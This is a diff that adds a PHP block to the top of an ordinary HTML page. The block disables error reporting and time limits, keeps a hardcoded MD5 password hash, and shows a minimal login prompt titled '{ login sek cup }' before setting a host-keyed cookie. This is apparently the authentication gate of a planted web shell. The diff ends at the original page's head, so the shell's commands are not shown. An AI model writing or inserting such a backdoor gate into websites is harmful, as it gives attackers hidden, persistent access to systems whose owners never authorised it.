@@ -1,3 +1,65 @@
+<?php
+session_start();
+set_time_limit(0);
+error_reporting(0);
+date_default_timezone_set("Asia/Jakarta");
+$auth_pass = "5198ade478b8d0e2a3c9191b823ea951"; // HTML404
+if(get_magic_quotes_gpc()) { 	
+function VEstripslashes($array) { 		
+return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array); 	} 	
+$_POST = VEstripslashes($_POST); 
+$_COOKIE = VEstripslashes($_COOKIE); } 
+
+
+function Login() {
+	die("
+<html>
+<head>
+<title>{ login sek cup }</title>
+<style type='text/css'>
+html {
+    margin: 20px auto;
+    background:black;
+    color: green;
+    text-align: center;
+}
+pre {
+    color: white;
+}
+
+input[type=password] {
+	background:transparent;
+	color:white;
+	margin:0 10px;
+	font-family:Homenaje;
+	font-size:13px;
+	border:2px solid white;
+}
+
+</style>
+</head>
+<center>
+<br>
+<br>
+<header>
+<br>
+<pre align=center><form method='post'><input type='password' name='pass' style='background-color:none;border:1px solid #FFF;outline:none;' required><input type=submit value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>
+");
+}
+
+function VEsetcookie($k, $v) {
+    $_COOKIE[$k] = $v;
+    setcookie($k, $v);
+}
+
+if(!empty($auth_pass)) {
+    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
+        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
+
+    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
+        Login();
+}
+?>
 <!DOCTYPE html>
 <html>
 <head>
